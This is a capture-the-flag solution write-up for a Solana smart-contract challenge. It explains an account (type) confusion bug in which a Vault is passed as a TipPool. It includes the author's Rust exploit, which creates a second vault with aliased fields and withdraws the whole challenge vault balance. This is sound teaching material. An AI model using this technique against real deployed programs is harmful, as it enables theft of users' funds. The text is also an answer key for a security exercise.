# Solution - Account confusion

The vulnerability in this contract is called account-confusion. Outside of the solana contract this type of vulnerability is called *type confusion*. It happens whenever data is misinterpreted. Programs often have to rely on a certain data structure, often a user can not control the data directly for a certain type, but for another one. If a program has a type confusion bug, it expects, that the data cannot be user controlled, but it fails to check the type, therefore a malicious attacker trick the program to use the controlled data instead. For example in this instance an attacker can initialize a second vault and use the withdraw instruction with the vault account as a pool account.

In this case, we confuse a `TipPool` with a `Vault`. The fields will overlap nicely:

```rust
pub struct TipPool {
    pub withdraw_authority: Pubkey, // at the same position as Vault::creator
    pub value: u64,                 // at the same position as Vault::fee
    pub vault: Pubkey,              // at the same position as Vault::fee_recipient
}

pub struct Vault {
    pub creator: Pubkey,
    pub fee: f64,              
    pub fee_recipient: Pubkey,
    pub seed: u8,
}
```

Another thing that may be tricky to wrap your head around is that the program can be initialized twice, PDAs can be derived by a different seed result in different addresses, while in this case this is totally intended, there can be some cases, where not knowing this can lead to serious vulnerabilities.

example solution by Felipe (author):

```rust
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let seed: u8 = 1;
    let hacker_vault_address =
        Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();

    env.execute_as_transaction(
        &[level3::initialize(
            challenge.tip_program,
            hacker_vault_address,      // new vault's address
            challenge.hacker.pubkey(), // initializer_address. Aliases with TipPool::withdraw_authority
            seed,                      // seed != original seed, so we can create an account
            2.0,                       // some fee. Aliases with TipPool::amount (note u64 != f64. Any value >1.0 is a huge u64)
            challenge.vault_address,   // fee_recipient. Aliases with TipPool::vault
        )],
        &[&challenge.hacker],
    )
    .print();

    let amount = env.get_account(challenge.vault_address).unwrap().lamports;

    env.execute_as_transaction(
        &[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address,
            hacker_vault_address,
            challenge.hacker.pubkey(),
            amount,
        )],
        &[&challenge.hacker],
    )
    .print();
}
```